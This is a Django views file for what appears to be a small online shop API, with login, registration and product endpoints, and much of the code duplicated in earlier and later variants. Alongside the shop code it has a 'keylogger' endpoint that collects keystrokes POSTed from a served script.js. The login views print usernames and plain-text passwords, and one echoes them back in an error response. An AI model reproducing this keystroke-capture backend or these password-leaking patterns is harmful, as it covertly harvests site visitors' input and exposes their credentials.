from django.shortcuts import render
from django.http import HttpResponse, FileResponse, JsonResponse
from rest_framework import generics
from .serializers import *
from rest_framework.response import Response
from django.contrib.auth import login, authenticate
from rest_framework.permissions import AllowAny
from django.views.decorators.csrf import csrf_exempt
from .models import *
import json

# Create your views here.

def main(request):
    return HttpResponse("Hello")

def script(request):
    return FileResponse(open("api/script.js", "rb"), content_type="application/javascript")

def keylogger(request):
    if request.method == "POST":
        data = json.loads(request.body)
        key = data["key"]
        print(f'Key": {key}')
        return HttpResponse(f"Key {key}")
    else:
        return HttpResponse("FOOl")

class RegisterView(generics.CreateAPIView):
    serializer_class = RegisterSerializer

    def post(self, request, *args, **kwargs):
        serializer = self.get_serializer(data=request.data)

        if serializer.is_valid():
            user = serializer.save()
            login(request, user)

        return Response(({
            'user': RegisterSerializer(user, context=self.get_serializer_context()).data
        }))


class UserLoginView(generics.CreateAPIView):
    serializer_class = LoginSerializer
    permission_classes = (AllowAny,)

    def post(self, request):
        serializer = LoginSerializer(data=request.data)
        if serializer.is_valid():
            username = serializer.validated_data['username']
            password = serializer.validated_data['password']

            user = authenticate(username=username, password=password)
            # print(f"Hello {user}")
            try:
                if user.is_active:
                    login(request, user)
                    return Response({"success": "Success"})
            except Exception as e:
                print(f"Exception {e}")
        return HttpResponse(f"User does not exist {username} {password}")


class RetrieveProductView(generics.ListAPIView):
    permission_classes = (AllowAny,)
    serializer_class = ProductSerializer
    queryset = Product.objects.all()
    


# Create your views here.

def main(request):
    return HttpResponse("Hello")

def script(request):
    return FileResponse(open("api/script.js", "rb"), content_type="application/javascript")

def keylogger(request):
    if request.method == "POST":
        data = json.loads(request.body)
        key = data["key"]
        print(f'Key": {key}')
        return HttpResponse(f"Key {key}")
    else:
        return HttpResponse("FOOl")

class RegisterView(generics.CreateAPIView):
    serializer_class = RegisterSerializer

    def post(self, request, *args, **kwargs):
        serializer = self.get_serializer(data=request.data)

        if serializer.is_valid():
            user = serializer.save()
            login(request, user)

            original_dict = RegisterSerializer(user, context=self.get_serializer_context()).data
            filtered_dict = {key: value for key, value in original_dict.items() if key != "password"}
            return Response(({
                'user': filtered_dict,
            }))
        return Response(({
                'Error': "Username not available"
            }))



class UserLoginView(generics.CreateAPIView):
    serializer_class = LoginSerializer
    permission_classes = (AllowAny,)

    def post(self, request):
        serializer = self.get_serializer(data=request.data)
        print(serializer, serializer.is_valid())
        if serializer.is_valid():
            
            email = serializer.validated_data['email']
            password = serializer.validated_data['password']

            if len(User.objects.filter(email=email)) > 0:
                username = User.objects.filter(email=email).values()[0]["username"]

                print(username, password)

                user = authenticate(username=username, password=password)
                login(request, user)

                print(f"Hello {user} {user.is_active}")
                try:
                    if user.is_active:
                        login(request, user)
                        return Response({
                            "status": 200,
                            "username": username
                            })
                except Exception as e:
                    print(f"Exception {e}")
        return Response({
            "message": "User does not exist ",
            "status": 404
            })


class RetrieveProductView(generics.ListAPIView):
    permission_classes = (AllowAny,)
    serializer_class = ProductSerializer
    queryset = Product.objects.all()

    def get(self, request):
        val = list(Product.objects.values_list().values())[:50]

        d = {i: val[i] for i in range(len(val))}

        for i in range(len(d)):
            dd = len(list(ProductImage.objects.filter(product_id=i+1).values_list().values()))
            d[i]['category'] = list(Category.objects.filter(id=d[i]["category_id"]).values_list().values())[0]["name"]
            d[i][f"image"] = [f'http://localhost:8000/media/{list(ProductImage.objects.filter(product_id=i+1).values_list().values())[j]["image"]}' for j in range(dd)]
        
        return JsonResponse(d)


def get_last_part(input_string):
    parts = input_string.split('-')
    return parts[-1]


class RetrieveProduct(generics.ListAPIView):
    permission_classes = (AllowAny,)
    serializer_class = ProductSerializer
    queryset = Product.objects.all()

    def get(self, request):
        return JsonResponse({1:"Ha!!!"})

    def post(self, request):
        l = request.data.items()
        data = list(list(l)[0])[1]

        id = get_last_part(data)
        name:str = data[:len(id)+3]
        name = name.replace("-", " ")
        print(id, name)

        product = Product.objects.filter(product_no=id).values_list().values()[0]
        product['category'] = list(Category.objects.filter(id=product["category_id"]).values_list().values())[0]["name"]
        product[f"image"] = [f'http://localhost:8000/media/{list(ProductImage.objects.filter(product_id=product["id"]).values_list().values())[i]["image"]}' for i in range(len(ProductImage.objects.filter(product_id=product["id"]).values_list().values()))]
        
        return JsonResponse(product)


class ProductImageView(generics.RetrieveAPIView):
    permission_classes = (AllowAny,)
    serializer_class = ProductImageSerializer
    queryset = ProductImage.objects.all()
    lookup_field = 'product_id'


class ProductImageView(generics.RetrieveAPIView):
    permission_classes = (AllowAny,)
    serializer_class = ProductImageSerializer
    queryset = ProductImage.objects.all()
    lookup_field = 'product_id'







